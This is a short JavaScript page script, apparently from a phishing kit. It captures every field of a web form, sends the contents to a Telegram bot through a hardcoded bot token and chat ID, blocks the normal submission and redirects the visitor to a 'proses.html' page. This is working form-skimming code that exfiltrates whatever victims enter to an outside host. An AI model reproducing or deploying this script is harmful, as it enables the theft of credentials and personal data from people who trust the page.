     $(document).ready(function() {

       const chat_id ='7124492497',
         botID = 'bot8273236785:AAHBI1f_XcI2EpD8VMI2TThxOiv-0jFL8yU';

       const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;

       document.querySelector('#defis').addEventListener("submit", async e => { // When the user submits the form
         e.preventDefault(); // Don't submit
         let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
           Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
           null, 2); // Prettify the JSON so we can read the data easily
         const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
           method: 'POST',
           headers: { "Content-Type": "application/json" }, // This is required when sending a JSON body.
           body: JSON.stringify({ chat_id, text }), // The body must be a string, not an object
         });
         window.location.href = 'proses.html';
       });


     });
